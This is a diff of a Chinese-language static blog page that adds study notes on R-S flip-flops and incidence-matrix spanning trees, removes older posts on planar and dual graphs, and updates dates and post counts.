+<li><code>0</code>状态：$Q = 0\quad\overline{Q} = 1$</li>
+</ul>
+</li>
+<li><p>现态：输入信号作用前的状态</p>
+<ul>
+<li>记作$Q$ 和 $\overline{Q}$</li>
+</ul>
+</li>
+<li><p>次态：输入信号作用后的状态</p>
+<ul>
+<li>记作 $Q^{n+1}$ 和 $\overline{Q^{n+1}}$</li>
+</ul>
+</li>
+</ul>
+<h2 id="触发器常用的描述方法"><a href="#触发器常用的描述方法" class="headerlink" title="触发器常用的描述方法"></a>触发器常用的描述方法</h2><ul>
+<li>功能表</li>
+<li>状态表</li>
+<li>状态图</li>
+<li>次态方程</li>
+<li>激励表</li>
+<li>卡诺图</li>
+</ul>
+<h3 id="功能表"><a href="#功能表" class="headerlink" title="功能表"></a>功能表</h3><p>反映了触发器在不同输入下对应功能的表格</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211220205402667.png" alt="image-20211220205402667" style="zoom:50%;" /></p>
+<h3 id="状态表"><a href="#状态表" class="headerlink" title="状态表"></a>状态表</h3><p>反映了触发器在输入作用下现态和次态之间的转移关系</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211220205511950.png" alt="image-20211220205511950" style="zoom:50%;" /></p>
+<h3 id="激励表"><a href="#激励表" class="headerlink" title="激励表"></a>激励表</h3><p>反映了触发器从现态 $Q$ 转移到某种次态 $Q^{n+1}$ 时，对输入信号的要求</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211220205633985.png" alt="image-20211220205633985" style="zoom:50%;" /></p>
+<h3 id="状态图"><a href="#状态图" class="headerlink" title="状态图"></a>状态图</h3><p>反应触发器两种状态之间转移关系的有向图</p>
+<ul>
+<li>圆圈表示稳定状态</li>
+<li>有向线段表示状态转移的方向<ul>
+<li>起点：现态</li>
+<li>终点：次态</li>
+<li>触发条件</li>
+</ul>
+</li>
+</ul>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211220205923424.png" alt="image-20211220205923424" style="zoom:50%;" /></p>
+<h3 id="卡诺图"><a href="#卡诺图" class="headerlink" title="卡诺图"></a>卡诺图</h3><p>根据触发器的功能表或状态表所得到的反映触发器次态和现态以及输入关系的卡诺图</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211220210111667.png" alt="image-20211220210111667" style="zoom:50%;" /></p>
+<h3 id="次态方程"><a href="#次态方程" class="headerlink" title="次态方程"></a>次态方程</h3><p>反应触发器次态和现态以及输入关系的表达式</p>
+<ul>
+<li><p>次态方程</p>
+<ul>
+<li>$Q^{n+1}=\overline{S}+RQ$</li>
+</ul>
+</li>
+<li><p>约束方程</p>
+<ul>
+<li>$R+S=1$</li>
+</ul>
+</li>
+</ul>
+<h2 id="基本R-S触发器"><a href="#基本R-S触发器" class="headerlink" title="基本R-S触发器"></a>基本R-S触发器</h2><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211220211625159.png" alt="image-20211220211625159" style="zoom:50%;" /></p>
+<ul>
+<li>构成各种功能触发器的基本部件</li>
+<li>R：置0端或复位端</li>
+<li>S：置1端或置位端</li>
+</ul>
+<h3 id="功能表与状态表"><a href="#功能表与状态表" class="headerlink" title="功能表与状态表"></a>功能表与状态表</h3><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211220211900696.png" alt="image-20211220211900696" style="zoom:50%;" /></p>
+<h3 id="状态表与激励表"><a href="#状态表与激励表" class="headerlink" title="状态表与激励表"></a>状态表与激励表</h3><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211220211942876.png" alt="image-20211220211942876" style="zoom:50%;" /></p>
+<h3 id="状态表、状态图、卡诺图、次态方程、约束方程"><a href="#状态表、状态图、卡诺图、次态方程、约束方程" class="headerlink" title="状态表、状态图、卡诺图、次态方程、约束方程"></a>状态表、状态图、卡诺图、次态方程、约束方程</h3><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211220212035910.png" alt="image-20211220212035910" style="zoom:50%;" /></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/18/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -702,7 +973,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-18 20:17:00" itemprop="dateModified" datetime="2021-12-18T20:17:00+08:00">2021-12-18</time>
+                <time title="修改时间：2021-12-22 11:05:36" itemprop="dateModified" datetime="2021-12-22T11:05:36+08:00">2021-12-22</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -733,6 +1004,14 @@
 <p>则矩阵$M(G)=[m_{ij}] _{p×q}$,其中</p>
 <p>$m_{ij} = \begin{cases}<br>1 &amp; \text{若vi关联ej}\\<br>0 &amp; \text{若vi不关联ej}\\<br>\end{cases}$</p>
 <p>称M(G)为<strong>关联矩阵</strong></p>
+<h3 id="无向图基本关联矩阵的秩"><a href="#无向图基本关联矩阵的秩" class="headerlink" title="无向图基本关联矩阵的秩"></a>无向图基本关联矩阵的秩</h3><p>定理：$G$ 连通 ⇒ $r(M_f(G))=n-1$</p>
+<p>推论1：$G$ 有 $p$ 个连通分支 ⇒ $r(M_f(G))=n-p$</p>
+<p>推论2：$G$ 连通 ⇔ $r(M(G))=r(M_f(G))=n-1$</p>
+<h3 id="用关联矩阵求所有生成树"><a href="#用关联矩阵求所有生成树" class="headerlink" title="用关联矩阵求所有生成树"></a>用关联矩阵求所有生成树</h3><ul>
+<li>忽略环, 求关联矩阵 $M$</li>
+<li>任选参考点, 求基本关联矩阵 $M_f$</li>
+<li>求 $M_f$ 中的所有 $n-1$ 阶子方阵,计算行列式,行列式的值<strong>模2非0</strong>的是生成树</li>
+</ul>
 <h2 id="邻接矩阵-A-D-A-G"><a href="#邻接矩阵-A-D-A-G" class="headerlink" title="邻接矩阵 A(D) A(G)"></a>邻接矩阵 A(D) A(G)</h2><h2 id="可达矩阵-P-D-P-G"><a href="#可达矩阵-P-D-P-G" class="headerlink" title="可达矩阵 P(D) P(G)"></a>可达矩阵 P(D) P(G)</h2>
       
     </div>
@@ -1297,200 +1576,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/05/%E6%9E%81%E5%A4%A7%E5%B9%B3%E9%9D%A2%E5%9B%BE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="Existo">
-      <meta itemprop="description" content="Hello Nerd">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Existo's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/05/%E6%9E%81%E5%A4%A7%E5%B9%B3%E9%9D%A2%E5%9B%BE/" class="post-title-link" itemprop="url">极大平面图</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-05 16:41:28" itemprop="dateCreated datePublished" datetime="2021-12-05T16:41:28+08:00">2021-12-05</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-13 00:47:12" itemprop="dateModified" datetime="2021-12-13T00:47:12+08:00">2021-12-13</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="平面图"><a href="#平面图" class="headerlink" title="平面图"></a>平面图</h1><p>在平面上边与边不在非顶点处相交的图</p>
-<h1 id="面和次"><a href="#面和次" class="headerlink" title="面和次"></a>面和次</h1><p>面(face): 区域及其边界</p>
-<p>面的次数(degree): deg( R ) = 边界长度</p>
-<p>$\displaystyle\sum\limits_{i=0}^r deg(Ri)$ = 2m</p>
-<ul>
-<li>r(面数)</li>
-</ul>
-<h2 id="极大平面图"><a href="#极大平面图" class="headerlink" title="极大平面图"></a>极大平面图</h2><p>简单平面图, 但是在任意两个不相邻顶点之间加边就是非平面图</p>
-<p>特点：</p>
-<ul>
-<li>极大平面图一定是<strong>连通图</strong></li>
-<li>极大平面图一定<strong>不含有割点和桥</strong></li>
-</ul>
-<p><strong>割点</strong>：一个无向连通图，删除一个点及其连接边，若此连通图不再联通，再此点称为割点</p>
-<p><strong>桥</strong>：类似于割点，不过是<strong>边</strong></p>
-<ul>
-<li><p>极大平面图的每个面的次<strong>等于3</strong>（定理）</p>
-</li>
-<li><p>n(n ≥ 4)阶极大平面图G中,d(G) ≥ 3</p>
-</li>
-</ul>
-<h2 id="欧拉公式"><a href="#欧拉公式" class="headerlink" title="欧拉公式"></a>欧拉公式</h2><p>设G是连通平面图, 则 <code>n - m + r = 2</code></p>
-<p>其中r是G的面数,n是G的阶,m是G的边数</p>
-<h3 id="推论"><a href="#推论" class="headerlink" title="推论"></a>推论</h3><ul>
-<li>设n阶简单平面图有m条边，则 m $\leq$ 3n - 6</li>
-<li>设n(≥ 3)阶<strong>简单极大平面图</strong>G有m条边,则 <strong>m = 3n - 6</strong>.</li>
-</ul>
-<h2 id="同胚"><a href="#同胚" class="headerlink" title="同胚"></a>同胚</h2><p>同胚: 反复插入或删除2度顶点后同构</p>
-<h2 id="对偶图"><a href="#对偶图" class="headerlink" title="对偶图"></a>对偶图</h2><p><img src="https://s2.loli.net/2021/12/12/tCsrTH96LPKobMk.png" style="zoom:50%;" /></p>
-<p>对于每一个平面图， 都有与其相对应的对偶图. 我们假设上面的例图是图G， 与其对应的对偶图G*， 那么对于G*来说， G*上面的每一个点， 对应的是G里面的每一个面. 比如说下面就是G*</p>
-<p><img src="https://s2.loli.net/2021/12/12/ImafNKsoRnledcL.png" style="zoom:50%;" /></p>
-<p>上面的点就是对偶图G里的点.<br>那么关于对偶图G*里的边呢 ? 对于G中本来的每条边e， 他是两个面(比如说面f1和f2)的交边， 那么在对偶图里， 我们对这两个面(f1， f2)所映射在G*里的点连线(f1* 连向f2*). 如果f1 == f2(比如说G中5， 6这条边， 边的两侧都是同一个面， 那我们就建一条回边.<br>图就长这样(回边在5， 6那里).</p>
-<p><img src="https://s2.loli.net/2021/12/12/VKmWdHYLNPpO5jc.png" style="zoom:50%;" /></p>
-<p>n=|V(G)|,m=|E(G)|,r是G的面数。<br>n*=|V(G*)|,m*=|E(G*)|,r*是G*<br>的面数。<strong>p是G的连通分支数</strong>，<br>则</p>
-<ul>
-<li><p><strong>n*=r</strong></p>
-</li>
-<li><p><strong>m*=m</strong></p>
-</li>
-<li><p><strong>r*=n-p+1</strong></p>
-</li>
-</ul>
-<h3 id="对偶图的性质："><a href="#对偶图的性质：" class="headerlink" title="对偶图的性质："></a>对偶图的性质：</h3><ol>
-<li>对于连通平面图G，G*与G互为对偶图.</li>
-<li>如果G是平面图,则G*也是平面图。</li>
-<li>若边e为G中的环,则G*与e对应的边e*为桥; 若e为桥, 则G*中与e对应的边e*为环.</li>
-<li>在多数情况下,G*含有平行边.</li>
-<li>同构的平面图的对偶图不一定同构.</li>
-<li>任何平面图的<strong>对偶图总是连通的</strong></li>
-</ol>
-<h3 id="自对偶图"><a href="#自对偶图" class="headerlink" title="自对偶图"></a>自对偶图</h3><p>自对偶图: G ≅ G*</p>
-<p>轮图W~n~ :在 n-1 (n ≥ 4) 边形 Cn-1 内放置一个顶点，使其与 C~n-1~ 上 n-1 个顶点均相邻。</p>
-<p>n ≥ 4时, 轮图 W~n~ 是自对偶图</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/02/12-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="Existo">
-      <meta itemprop="description" content="Hello Nerd">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Existo's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/02/12-2/" class="post-title-link" itemprop="url">12.2</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-12-02 16:03:01 / 修改时间：16:04:13" itemprop="dateCreated datePublished" datetime="2021-12-02T16:03:01+08:00">2021-12-02</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%97%A5%E5%BF%97/" itemprop="url" rel="index"><span itemprop="name">日志</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>给博客加了LiveRe评论系统，虽然我也不知道搞这个东西有啥用</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1562,7 +1647,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1575,7 +1660,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
